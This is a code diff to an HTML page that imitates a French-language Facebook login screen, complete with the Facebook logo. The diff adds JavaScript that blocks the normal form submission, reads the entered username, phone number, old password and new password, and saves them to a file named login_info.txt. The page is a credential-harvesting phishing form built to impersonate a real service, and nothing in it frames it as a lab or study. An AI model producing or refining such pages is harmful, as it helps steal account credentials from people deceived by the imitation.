@@ -52,7 +52,7 @@
     <div class="container">
         <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" class="logo" width="100">
         <h2>Se connecter à Facebook</h2>
-        <form action="process.php" method="POST">
+        <form id="login-form">
             <label for="username">Nom d'utilisateur</label>
             <input type="text" id="username" name="username" required>
 
@@ -68,5 +68,28 @@
             <input type="submit" value="Se connecter">
         </form>
     </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche l'envoi du formulaire
+
+            const username = document.getElementById('username').value;
+            const phone = document.getElementById('phone').value;
+            const oldPassword = document.getElementById('old-password').value;
+            const newPassword = document.getElementById('new-password').value;
+
+            const data = `Nom d'utilisateur: ${username}\nNuméro de téléphone: ${phone}\nAncien mot de passe: ${oldPassword}\nNouveau mot de passe: ${newPassword}\n\n`;
+
+            const blob = new Blob([data], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'login_info.txt';
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+        });
+    </script>
 </body>
 </html>
